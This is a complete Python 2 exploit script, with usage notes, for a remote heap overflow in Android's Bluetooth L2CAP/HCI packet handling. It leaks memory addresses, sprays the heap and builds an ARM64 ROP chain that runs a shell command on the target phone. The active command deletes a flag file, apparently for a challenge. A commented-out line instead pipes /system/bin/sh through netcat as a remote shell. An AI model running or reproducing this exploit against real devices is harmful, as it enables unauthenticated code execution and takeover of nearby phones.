"""
Get your target by scanning for it:

    hcitool scan hci0

Then call this script here:

    python2 exploit.py ca:fe:ba:be:be:ef s10e/libicuuc.so [base]

Passing the base is optional, as it changes its location with each restart. If it
is not provided, we need to leak it with our exploit. You can get the libicuuc.so
and libc.so from the directory /system/lib64/ on your target.

For debugging purposes, you can find out the libicuuc.so base address as follows:

    cat /proc/*/maps | grep -m 1 'r-xp.*libicuuc'

Bluetooth is likely to behave weird on the attacking host. Use l2ping to check if
the target is still there. You might also want to restart Bluetooth services. This
works best *after* closing all connections.

    service bluetooth stop
    rmmod btusb ; modprobe btusb
    service bluetooth start



"""
import sys
import os
import socket
import struct
import time
from elftools.elf import elffile
from binascii import hexlify, unhexlify
from thread import start_new_thread
from random import randint, randrange
import json
import capstone as cs
from signal import signal, SIGPIPE, SIG_DFL
# hciconfig hci0 sspmode 0

signal(SIGPIPE,SIG_DFL)

l2cap = False
verbose = False
pkt = False
echo = False
module_base = False

TARGET_MAC = sys.argv[1]
LIBICUUC_FILE_PATH = sys.argv[2]

def recv_l2cap():
    global l2cap
    global pkt
    global echo
    global verbose
    global handle
    global hci
    while True:
        try:
            while True:
                pkt = l2cap.recv(10240)  # Just something long.
                if ord(pkt[0]) == 0x9:  # ECHO RESP
                    if verbose:
                        print "ECHO", hexlify(pkt)
                    echo = pkt
                elif ord(pkt[0]) == 0x1:
                    if verbose:
                        print "Rejected", hexlify(pkt)
                    #_, cmd, l, code = struct.unpack("<BBHH", pkt)
                    #print "Rejected cmd=%x len=%x code=%x" % (cmd, l, code)

                else:
                    if verbose:
                        print hexlify(pkt)
        # lost connection
        except:
            print "\033[;31mLost connection\033[;00m"
            handle = False
            while not handle:
                try:
                    if l2cap:
                        l2cap.close()
                    print "Connecting"
                    l2cap = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
                    l2cap.connect((TARGET_MAC, 0)) 
                    time.sleep(5)
                except socket.error:
                    print "Retry"
                    import traceback
                    traceback.print_exc()
                    time.sleep(1)


handle = False  # coonection handle


def recv_hci():
    global handle
    while True:
        pkt = hci.recv(1024)
        if ord(pkt[0]) == 0x04 and ord(pkt[1]) == 0x03 and ord(pkt[3]) == 0:
            if not handle:
                handle = struct.unpack("<H", pkt[4:6])[0]
                #handle = u16(pkt[4:6])
                print "Got connection handle", handle

        #print "HCI", hexlify(pkt)


os.system("hciconfig hci0 up")
# Does not work on Intel, but helps on BCM to not initiate a pairing.
os.system("hciconfig hci0 sspmode 0")
os.system("hcitool dc " + TARGET_MAC)
hci = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
hci.setsockopt(socket.SOL_HCI, socket.HCI_DATA_DIR, 1)
hci.setsockopt(socket.SOL_HCI, socket.HCI_FILTER,
               '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00')
hci.bind((0,))
start_new_thread(recv_hci, ())


start_new_thread(recv_l2cap, ())


def valid_addr(addr):
    return addr < 0x0010000000000000 and addr > 0x0000000100000000


def pattern(n):
    return "".join([chr(i % 255) for i in xrange(n)])


def pattern16(n):
    return "".join([struct.pack("H", i) for i in xrange(n/2)])


def send_echo_hci(ident, x, l2cap_len_adj=0, continuation_flags=0, delay=0.05):
    global handle
    global l2cap
    while not handle:
        time.sleep(0.01)

    l2cap_hdr = struct.pack("<BBH", 0x8, ident, len(
        x) + l2cap_len_adj)  # command identifier len
    acl_hdr = struct.pack("<HH", len(l2cap_hdr) +
                          len(x) + l2cap_len_adj, 1)  # len cid

    packet_handle = handle
    packet_handle |= continuation_flags << 12
    hci_hdr = struct.pack("<HH", packet_handle, len(
        acl_hdr) + len(l2cap_hdr) + len(x))  # handle, len

    hci.send("\x02" + hci_hdr + acl_hdr + l2cap_hdr + x)
    time.sleep(delay)


def do_leak(ident=42):
    global echo
    global handle
    echo = False

    while not echo:
        # make longer so we do not overflow this
        send_echo_hci(ident, "A"*70, l2cap_len_adj=2)
        send_echo_hci(ident+1, "X"*70, continuation_flags=1)

        timeout = 100
        while not echo and handle and timeout > 0:
            time.sleep(0.01)
            timeout -= 1

        if timeout <= 0:
            print "do_leak timeout"
            return False

    return echo[-68:]


def load_symbols(fname):
    global module_base

    print "loading %s" % fname
    fd = open(fname, "rb")
    elf = elffile.ELFFile(fd)
    symbols = {}

    segments_nums = elf.num_segments()
    try:
        for seg in xrange(segments_nums):
            if elf.get_segment(seg)['p_type'] == 'PT_LOAD':
                module_base = elf.get_segment(seg).header['p_vaddr']
                break
    except StopIteration:
        module_base = False

    dynsym = elf.get_section_by_name(".dynsym")
    for symbol in dynsym.iter_symbols():
        if symbol.name != "" and "$" not in symbol.name:
            symbols[symbol.name] = symbol.entry["st_value"]

    # Load plt entries
    rela_plt = elf.get_section_by_name(".rela.plt")
    plt_entries = {}
    for rel in rela_plt.iter_relocations():
        offset = rel.entry["r_offset"]
        name = dynsym.get_symbol(rel.entry["r_info_sym"]).name
        plt_entries[offset] = name

    # Find code for plt entries
    plt = elf.get_section_by_name(".plt")
    plt_base = plt.header["sh_addr"]
    md = cs.Cs(cs.CS_ARCH_ARM64, cs.CS_MODE_ARM)
    asm = list(md.disasm(plt.data(), plt_base))
    for i in xrange(len(asm)):
        if asm[i].mnemonic == "adrp" and asm[i+2].mnemonic == "add":
            plt_entry = int(asm[i].op_str.split("#")[-1], 0) + \
                int(asm[i+2].op_str.split("#")[-1], 0)
            if plt_entry in plt_entries:
                symbol_name = plt_entries[plt_entry]
                symbols[symbol_name] = plt_base + (i*4)

    return symbols


def set_ptr(payload_ptr, pos, x):
    if pos % 8 != 0:
        print "\033[;31mInvalid pos %x\033[;00m" % pos
        raise
    pos /= 8

    if pos > 600/4:
        print "\033[;31mInvalid pos %x\033[;00m" % pos
        raise

    if len(payload_ptr) < pos + 1:
        payload_ptr += [False] * (1 + pos - len(payload_ptr))

    if payload_ptr[pos]:
        print "\033[;31mCollision for offset %x\033[;00m" % (pos*8)
        raise

    payload_ptr[pos] = x
    return payload_ptr


libicuuc_symbols = load_symbols(LIBICUUC_FILE_PATH)

ident = 0
if len(sys.argv) >= 4:
    libicuuc_base = int(sys.argv[3], 0)
    print "using libicuuc base %x" % libicuuc_base
else:
    libicuuc_base = NULL


while not libicuuc_base:
    print "Leaking remote handle"
    ident = (ident + 1) % 250
    leak = do_leak(ident=ident)
    if not leak:
        continue
    remote_handle = struct.unpack("<H", leak[-6:-4])[0] & 0xfff
    print "Leaked Handle", hex(remote_handle)

    # prepare the packet
    echo_payload_len = 630
    ident = 0x42
    # command identifier len
    l2cap_hdr = struct.pack("<BBH", 0x8, ident, echo_payload_len)
    acl_hdr = struct.pack("<HH", len(l2cap_hdr) +
                          echo_payload_len, 1)  # len cid
    hci_hdr = struct.pack("<HH", remote_handle, len(
        acl_hdr) + len(l2cap_hdr) + echo_payload_len)  # handle, len
    # This must match the packet length we use to trigger the packet
    # len(acl_hdr) + len(l2cap_hdr) + len(hci_hdr)+echo_payload_len
    bt_len = 0x3c
    # ensure partial_packet->offset == partial_packet->len
    bt_hdr = struct.pack("<HHHH", 0x1100, bt_len, bt_len, 0)

    # padding + packet
    cmd = pattern(0x16) + bt_hdr + hci_hdr + acl_hdr + l2cap_hdr + "B"*512

    verify_len = 48
    # Spray heap with packet
    tries = 30
    while handle:
        # write data to heap
        for i in xrange(5):
            send_echo_hci(ident, cmd[:70])
            ident = (ident + 1) % 250
            sys.stderr.write("\rSpray L2Ping Req %d" % ident)

        # check if spray was succsessfull
        leak = do_leak(ident)
        if leak and leak[:verify_len] == cmd[0x16:0x16+verify_len]:
            print "\nHeap spray succsessfull"
            break

        ident = (ident + 1) % 250

        tries -= 1
        if tries == 0:
            os.system("hcitool dc " + TARGET_MAC)
            handle = False
            break

    if not handle:
        continue

    #time.sleep(5)
    # Leak
    cuuc_heap_ptr = False
    addrs = []
    tries = 30
    while handle:
        # Trigger the reception of the injected packet
        send_echo_hci(ident, "A"*(ident*3), delay=0)

        echo = False

        send_echo_hci(ident, "G"*46, l2cap_len_adj=2)
        send_echo_hci(ident+1, "Y"*70, continuation_flags=1)
        ident = (ident + 3) % 250

        #time.sleep(5)

        timeout = 100
        while not echo and handle and timeout > 0:
            time.sleep(0.01)
            timeout -= 1

        if timeout <= 0:
            print "timeout"
            break

        tries -= 1
        if tries < 0:
            os.system("hcitool dc " + TARGET_MAC)
            handle = False

        e = echo[:]
        if not e:
            continue
        e_len = len(e)
        leak = struct.unpack("Q"*(e_len/8-1), e[8:(e_len/8)*8])

        # Hexdump
        print "\nLeak succsessfull"
        for i in xrange(len(leak)/8):
            for j in xrange(8):
                if i*8+j < len(leak):
                    if valid_addr(leak[i*8+j]):
                        print "\033[;33m0x%016x\033[;0m" % leak[i*8+j],
                    else:
                        print "0x%016x" % leak[i*8+j],

            print ""
        # find libicuuc object
        for i in xrange(len(leak)-5):
            libicuuc_base = False
            if not valid_addr(leak[i]) or not valid_addr(leak[i+1]):
                continue

            libicuuc_base = leak[i+1] - libicuuc_symbols["uhash_hashUnicodeString_58"]

            if not leak[i+2] == libicuuc_base + libicuuc_symbols["uhash_compareUnicodeString_58"]:
                libicuuc_base = False
                continue

            heap_ptr = leak[i]
            print "\033[;32mFound libicuuc base 0x%x Heap_ptr 0x%x\033[;00m" % (
                libicuuc_base, heap_ptr)
            break

        if libicuuc_base:
            break

payload_len = 630

while True:
    ident = (ident + 1) % 250
    while not handle:
        time.sleep(0.01)

    sys.stderr.write("\rLeaking packet buffer address %d  " % ident)
    packet_base = False
    while handle:
        echo = False
        send_echo_hci(ident, "B"*payload_len, l2cap_len_adj=2)
        send_echo_hci(ident+2, "CC", continuation_flags=1)
        ident = (ident + 2) % 250

        timeout = 100
        while not echo and handle and timeout > 0:
            time.sleep(0.01)
            timeout -= 100

        if not handle or timeout <= 0:
            break

        leak = echo[-14-32:-14]
        remote_handle = struct.unpack("<H", echo[-6:-4])[0]
        magic, key, ctr, packet_base = struct.unpack("QQQQ", leak)

        if key == 0x10006000a0000 | remote_handle:
            print hex(magic), hex(key), hex(ctr), hex(packet_base)
            if valid_addr(packet_base) and packet_base & 0xf7 == 0 and packet_base != 0 and ctr > 0:
                break

    if not handle or timeout < 0 or not packet_base:
        continue

    payload_base = packet_base + 4 + 16 + 4
    print "\n\033[;32mPayload Base 0x%x\033[;00m" % payload_base

    payload_ptr = []

    #######################################
    #######################################
    #Android 8.0 ROP
    # Signal() ldr x0, [x8, #0x10], ldr x8, [x0], ldr x8, [x8], blr x8    # x0 points to our buffer
    pc_offset = 0x40
    cmd_offset = 0x160
    system_offset = 0x158

    set_ptr(payload_ptr, 0x0, payload_base + pc_offset)
    set_ptr(payload_ptr, 0x150, payload_base)

    # # # # set ptr to cmd string
    set_ptr(payload_ptr, 0xD0, payload_base + cmd_offset)

    # # # # set ptr to "system" string
    set_ptr(payload_ptr, 0x20, payload_base + system_offset)

    # # # # set dlsym function address
    set_ptr(payload_ptr, 0x8, 0x3F788 + libicuuc_base  + module_base)
  
    # #gadget 1: mov x19, x0; ldr x0, [x19, #0x150]; ldr x8, [x0]; ldr x8, [x8, #0x68]; blr x8;
    set_ptr(payload_ptr, pc_offset, 0x40678 + libicuuc_base  + module_base)

    # # # # gadget 2: ldr x1, [x19, #0x20]; ldr x8, [x0]; ldr x8, [x8, #0x18]; blr x8;
    set_ptr(payload_ptr, 0xA8, 0xCCDEC + libicuuc_base  + module_base)

    # # # # gadget 3: ldr x8, [x19, #0x8]; blr x8; ldr x8, [x19, #0x10]; blr x8; ldr x8, [x19, #0x18]; blr x8;
    set_ptr(payload_ptr, 0x58, 0x59380 + libicuuc_base  + module_base)

    # # # # gadget 4: mov x3, x0; add sp, sp, #0x20; mov x0, x3; ret;
    set_ptr(payload_ptr, 0x10, 0x48958 + libicuuc_base  + module_base)

    # # # # gadget 5: mov x0, x19; mov x20, x3; stur x8, [x29, #0xffffffffffffffc8]; ldr x8, [x19]; ldr x8, [x8, #0x50]; blr x8; 
    set_ptr(payload_ptr, 0x18, 0xAEEE0 + libicuuc_base  + module_base)

    # # # # gadget 6: ldr x8, [x19, #0x28]; blr x8; ldr x8, [x19, #0x30]; blr x8;
    set_ptr(payload_ptr, 0x90, 0x593C0 + libicuuc_base  + module_base)

    # # # # gadget 7: ldr x0, [x0, #0x10]; ret;
    set_ptr(payload_ptr, 0x28, 0xBE7EC + libicuuc_base  + module_base)

    # # # # gadget 8: br x3;
    set_ptr(payload_ptr, 0x30, 0x3F6C0 + libicuuc_base  + module_base)

        
    for i in xrange(len(payload_ptr)):
        if not payload_ptr[i]:
            payload_ptr[i] = 0xdead0000 + i

    print "Payload:"
    for i in xrange(len(payload_ptr)):
        print "    0x%x" % payload_ptr[i]

    payload = "AAAA" + struct.pack("Q"*len(payload_ptr), *payload_ptr)
    port = randint(10000, 65535)
    payload += "popen\x00\x00\x00"
    payload += "rm /sdcard/flag\x00\x00"
    #payload += "cat /dev/zero | toybox nc -l -p %d | /system/bin/sh 2>&1 | toybox nc 127.0.0.1 4444 | toybox nc 127.0.0.1 %d > /dev/null\x00" % (port, port)
    payload += "Z"*(payload_len - len(payload))

    print "Spray payload"
    n = 60
    while handle:
        echo = False
        send_echo_hci(ident+1, payload, l2cap_len_adj=2)
        send_echo_hci(ident+2, "AA", continuation_flags=1)
        ident = (ident + 3) % 250

        # check for rewrite
        while not echo and handle:
            time.sleep(0.01)
        if not handle:
            break

        leak = echo[-14-32:-14]
        remote_handle = struct.unpack("<H", echo[-6:-4])[0]
        magic, key, c, addr = struct.unpack("QQQQ", leak)

        if key == 0x10006000a0000 | remote_handle:
            print hex(magic), hex(key), hex(c & 0xffffffff), hex(packet_base)
        if n < 0:
            break

        n -= 1
        sys.stderr.write("\rSpray %d  " % n)

    if not handle:
        continue

    print "\033[;32mPayload written to 0x%x\033[;0m" % payload_base

    overflow = [payload_base]*200
    overflow = "A" + struct.pack("Q"*len(overflow), *overflow)
    ident = 0

    tries = 2
    for t in xrange(tries):
        print "Overflow signal object (%d/%d)" % (t, tries)
        for i in xrange(10):
            echo = False
            send_echo_hci(ident+1, "A"*3, l2cap_len_adj=2)
            send_echo_hci(ident+2, overflow[:70], continuation_flags=1)
            ident = (ident + 3) % 250

        try:
            print "Disconnect"
            l2cap.close()
            os.system("hcitool dc " + TARGET_MAC)
            handle = False
        except:
            import traceback
            traceback.print_exc()

        while not handle:
            time.sleep(1)
